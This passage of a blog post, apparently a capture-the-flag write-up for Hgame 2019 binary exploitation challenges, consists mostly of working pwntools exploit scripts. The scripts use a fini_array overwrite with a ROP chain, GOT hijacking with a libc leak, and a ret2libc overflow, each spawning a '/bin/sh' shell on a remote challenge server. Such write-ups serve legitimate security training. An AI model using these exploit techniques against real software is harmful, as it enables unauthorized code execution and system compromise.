class="line">p=process(<span class="string">"3x18"</span>)</span><br><span class="line"><span class="comment">#p=remote("chall.pwnable.tw",10105)</span></span><br><span class="line">p=remote(<span class="string">"118.89.111.179"</span>,<span class="number">12331</span>)</span><br><span class="line"><span class="comment">#_fini_array</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>)+p64(<span class="number">0x401ba3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop_chain</span></span><br><span class="line">pop_rdi=<span class="number">0x401696</span></span><br><span class="line">pop_rax=<span class="number">0x41e4af</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x44a309</span></span><br><span class="line">bin_sh_addr=<span class="number">0x4b4140</span></span><br><span class="line">pop_rsp_ret=<span class="number">0x0402ba9</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b70c0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x401ba3</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x4b40f8</span>)+p64(<span class="number">0x401c4b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4100</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdi))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4108</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(bin_sh_addr)+p64(pop_rax)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4120</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4138</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x446e2c</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b70c0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h3><p><strong>2&amp;&amp;3的预期解应该是程序的延迟绑定机制:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;kirin-say.top&#x2F;2018&#x2F;08&#x2F;18&#x2F;ret2-dl-runtime-resolve&#x2F;</span><br></pre></td></tr></table></figure>
<p>不过很容易用其他方法bypass：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("blind")</span></span><br><span class="line">p=remote(<span class="string">"118.89.111.179"</span>,<span class="number">12332</span>)</span><br><span class="line">edit((<span class="number">0x6011f0</span><span class="number">-0x6012c0</span>)/<span class="number">8</span>,p64(<span class="number">0x601240</span>)[:<span class="number">6</span>]+<span class="string">"\n"</span>)</span><br><span class="line">edit((<span class="number">0x00601018</span><span class="number">-0x6012c0</span>)/<span class="number">8</span>,p64(<span class="number">0x4006e0</span>)[:<span class="number">6</span>]+<span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x121</span>)+<span class="string">"\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">edit((<span class="number">0x6011f0</span><span class="number">-0x6012c0</span>)/<span class="number">8</span>,p64(<span class="number">0x601208</span>)[:<span class="number">6</span>]+<span class="string">"\n"</span>)</span><br><span class="line">edit((<span class="number">0x00601018</span><span class="number">-0x6012c0</span>)/<span class="number">8</span>,p64(<span class="number">0x4006f0</span>)[:<span class="number">6</span>]+<span class="string">"\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,<span class="string">"2"</span>)</span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>)+<span class="string">"\x00\x00"</span>)<span class="number">-0x4b78</span><span class="number">-0x3c000</span><span class="number">-0x384000</span></span><br><span class="line">edit((<span class="number">0x6011f0</span><span class="number">-0x6012c0</span>)/<span class="number">8</span>,p64(<span class="number">0x601208</span>)[:<span class="number">6</span>]+<span class="string">"\n"</span>)</span><br><span class="line">edit((<span class="number">0x00601018</span><span class="number">-0x6012c0</span>)/<span class="number">8</span>,p64(libc_addr+<span class="number">0x000045390</span>)[:<span class="number">6</span>]+<span class="string">"\n"</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index,s=<span class="string">"n\n"</span>)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">     p.sendafter(<span class="string">"confirm?"</span>,s)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("blind2")</span></span><br><span class="line">p=remote(<span class="string">"118.89.111.179"</span>,<span class="number">12333</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">11</span>,<span class="string">"a"</span>*<span class="number">17</span>+p32(<span class="number">0x80484e0</span>)+p32(<span class="number">0x804897e</span>)+p32(<span class="number">0x804a028</span>)+<span class="string">"\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"invalid range"</span>)</span><br><span class="line">libc_addr=u32(p.recv(<span class="number">5</span>)[<span class="number">1</span>:])<span class="number">-0x0005f140</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">delete(<span class="number">11</span>,<span class="string">"a"</span>*<span class="number">17</span>+p32(libc_addr+<span class="number">0x0003a940</span>)+p32(<span class="number">0x804897e</span>)+p32(libc_addr+<span class="number">0x15902b</span>)+<span class="string">"\n"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#week-1"><span class="toc-number">1.</span> <span class="toc-text">week 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">1.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2"><span class="toc-number">1.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3"><span class="toc-number">1.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4"><span class="toc-number">1.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-2"><span class="toc-number">2.</span> <span class="toc-text">week 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1"><span class="toc-number">2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1"><span class="toc-number">2.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1"><span class="toc-number">2.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1"><span class="toc-number">2.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-3"><span class="toc-number">3.</span> <span class="toc-text">week 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2"><span class="toc-number">3.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2"><span class="toc-number">3.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2"><span class="toc-number">3.3.</span> <span class="toc-text">3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2"><span class="toc-number">3.4.</span> <span class="toc-text">4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#week-4"><span class="toc-number">4.</span> <span class="toc-text">week 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3"><span class="toc-number">4.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3"><span class="toc-number">4.2.</span> <span class="toc-text">2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3"><span class="toc-number">4.3.</span> <span class="toc-text">3</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/02/22/Hgame-2019-PWN/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&text=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&is_video=false&description=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Hgame 2019 PWN&body=Check out this article: http://yoursite.com/2019/02/22/Hgame-2019-PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&title=Hgame 2019 PWN" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/02/22/Hgame-2019-PWN/&name=Hgame 2019 PWN&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


